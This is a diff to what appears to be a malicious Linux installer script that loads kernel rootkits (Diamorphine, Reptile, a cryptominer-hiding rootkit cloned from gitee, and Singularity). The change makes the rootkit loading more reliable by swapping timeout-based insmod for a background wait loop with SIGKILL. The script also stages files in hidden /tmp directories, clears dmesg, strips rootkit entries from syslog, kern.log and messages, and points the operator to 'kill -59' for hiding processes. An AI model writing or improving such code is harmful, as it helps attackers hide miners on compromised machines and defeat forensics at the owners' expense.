@@ -1231,17 +1231,26 @@ install_diamorphine() {
     
     # Load the module
     echo "[*] Loading Diamorphine kernel module..."
-    if ! timeout 15 insmod diamorphine.ko 2>/dev/null; then
-        EXIT_CODE=$?
-        if [ "$EXIT_CODE" -eq 124 ]; then
-            echo "[!] insmod timed out - diamorphine init hung"
-            pkill -9 -f "insmod diamorphine" 2>/dev/null || true
+    insmod diamorphine.ko 2>/dev/null &
+    INSMOD_PID=$!
+    INSMOD_SUCCESS=false
+    for _i in 1 2 3 4 5 6 7 8 9 10; do
+        sleep 1
+        if ! kill -0 "$INSMOD_PID" 2>/dev/null; then
+            wait "$INSMOD_PID" 2>/dev/null && INSMOD_SUCCESS=true
+            break
         fi
+    done
+    if kill -0 "$INSMOD_PID" 2>/dev/null; then
+        echo "[!] insmod hung after 10s — killing"
+        kill -9 "$INSMOD_PID" 2>/dev/null || true
+        wait "$INSMOD_PID" 2>/dev/null || true
+        cd /tmp; rm -rf diamorphine; return 1
+    fi
+    if [ "$INSMOD_SUCCESS" != true ]; then
         echo "[!] Failed to load Diamorphine"
-        echo "[!] Likely kernel 6.x incompatibility - try Reptile instead"
-        cd /tmp
-        rm -rf diamorphine
-        return 1
+        echo "[!] Likely kernel incompatibility - try Reptile instead"
+        cd /tmp; rm -rf diamorphine; return 1
     fi
     
     # Verify it loaded
@@ -1349,16 +1358,25 @@ install_reptile() {
     
     # Load the module
     echo "[*] Loading Reptile kernel module..."
-    if ! timeout 15 insmod reptile.ko 2>/dev/null; then
-        EXIT_CODE=$?
-        if [ "$EXIT_CODE" -eq 124 ]; then
-            echo "[!] insmod timed out - reptile init hung"
-            pkill -9 -f "insmod reptile" 2>/dev/null || true
+    insmod reptile.ko 2>/dev/null &
+    INSMOD_PID=$!
+    INSMOD_SUCCESS=false
+    for _i in 1 2 3 4 5 6 7 8 9 10; do
+        sleep 1
+        if ! kill -0 "$INSMOD_PID" 2>/dev/null; then
+            wait "$INSMOD_PID" 2>/dev/null && INSMOD_SUCCESS=true
+            break
         fi
+    done
+    if kill -0 "$INSMOD_PID" 2>/dev/null; then
+        echo "[!] insmod hung after 10s — killing"
+        kill -9 "$INSMOD_PID" 2>/dev/null || true
+        wait "$INSMOD_PID" 2>/dev/null || true
+        cd /tmp/.ICE-unix/.X11-unix; rm -rf Reptile; return 1
+    fi
+    if [ "$INSMOD_SUCCESS" != true ]; then
         echo "[!] Failed to load Reptile"
-        cd /tmp/.ICE-unix/.X11-unix
-        rm -rf Reptile
-        return 1
+        cd /tmp/.ICE-unix/.X11-unix; rm -rf Reptile; return 1
     fi
     
     # Verify it loaded
@@ -1450,19 +1468,29 @@ if git clone --depth 1 https://gitee.com/qianmeng/hiding-cryptominers-linux-root
             echo "[*] Loading rootkit module..."
             dmesg -C 2>/dev/null || true  # Clear ring buffer (non-blocking)
 
-            # Use timeout to prevent insmod from hanging (RHEL/kernel init hang)
-            if timeout 15 insmod rootkit.ko 2>/dev/null; then
+            # Run insmod in background — timeout+SIGTERM can't kill kernel-hung insmod,
+            # so we wait in a loop and SIGKILL the PID directly if it doesn't finish
+            insmod rootkit.ko 2>/dev/null &
+            INSMOD_PID=$!
+            INSMOD_SUCCESS=false
+            for _i in 1 2 3 4 5 6 7 8 9 10; do
+                sleep 1
+                if ! kill -0 "$INSMOD_PID" 2>/dev/null; then
+                    # process exited on its own
+                    wait "$INSMOD_PID" 2>/dev/null && INSMOD_SUCCESS=true
+                    break
+                fi
+            done
+            # If still running after 10s → SIGKILL
+            if kill -0 "$INSMOD_PID" 2>/dev/null; then
+                echo "[!] insmod hung after 10s — killing (kernel module init blocked)"
+                kill -9 "$INSMOD_PID" 2>/dev/null || true
+                wait "$INSMOD_PID" 2>/dev/null || true
+                echo "[*] Continuing without crypto rootkit..."
+            elif [ "$INSMOD_SUCCESS" = true ] && lsmod | grep -q "^rootkit" 2>/dev/null; then
                 echo "[✓] Crypto rootkit loaded"
             else
-                EXIT_CODE=$?
-                if [ "$EXIT_CODE" -eq 124 ]; then
-                    echo "[!] insmod timed out after 15s - kernel module init hung"
-                    echo "[!] Killing stuck insmod process..."
-                    pkill -9 -f "insmod rootkit" 2>/dev/null || true
-                else
-                    echo "[!] Failed to load crypto rootkit (exit code: $EXIT_CODE)"
-                fi
-                echo "[*] Continuing without crypto rootkit..."
+                echo "[!] Failed to load crypto rootkit — continuing..."
             fi
 
             # Immediately clean up rootkit load messages from logs
@@ -1542,29 +1570,32 @@ if [[ "$KERNEL_MAJOR" == "6" ]] || [ "$KERNEL_MAJOR" -eq 6 ] 2>/dev/null; then
                 
                 # Try to load the module
                 echo "[*] Loading Singularity kernel module..."
-                
-                if timeout 15 insmod singularity.ko 2>/dev/null; then
+                insmod singularity.ko 2>/dev/null &
+                INSMOD_PID=$!
+                INSMOD_SUCCESS=false
+                for _i in 1 2 3 4 5 6 7 8 9 10; do
+                    sleep 1
+                    if ! kill -0 "$INSMOD_PID" 2>/dev/null; then
+                        wait "$INSMOD_PID" 2>/dev/null && INSMOD_SUCCESS=true
+                        break
+                    fi
+                done
+                if kill -0 "$INSMOD_PID" 2>/dev/null; then
+                    echo "[!] insmod hung after 10s — killing"
+                    kill -9 "$INSMOD_PID" 2>/dev/null || true
+                    wait "$INSMOD_PID" 2>/dev/null || true
+                    SINGULARITY_LOADED=false
+                elif [ "$INSMOD_SUCCESS" = true ] && lsmod | grep -q "^singularity" 2>/dev/null; then
                     echo "[✓] Singularity loaded successfully!"
                     echo "[*] Use 'kill -59 <PID>' to hide processes"
-                    
-                    # Clean up logs
                     sleep 1
                     sed -i '/singularity/d' /var/log/syslog 2>/dev/null
                     sed -i '/singularity/d' /var/log/kern.log 2>/dev/null
                     sed -i '/singularity/d' /var/log/messages 2>/dev/null
-                    
-                    # Set flag for later process hiding
                     SINGULARITY_LOADED=true
                 else
-                    EXIT_CODE=$?
-                    if [ "$EXIT_CODE" -eq 124 ]; then
-                        echo "[!] insmod timed out - Singularity init hung"
-                        pkill -9 -f "insmod singularity" 2>/dev/null || true
-                    else
-                        echo "[!] Failed to load Singularity module"
-                        echo "[!] Check: dmesg | tail -20"
-                        dmesg | tail -5 | grep -i error || true
-                    fi
+                    echo "[!] Failed to load Singularity module"
+                    dmesg | tail -5 | grep -i error || true
                     SINGULARITY_LOADED=false
                 fi
             else
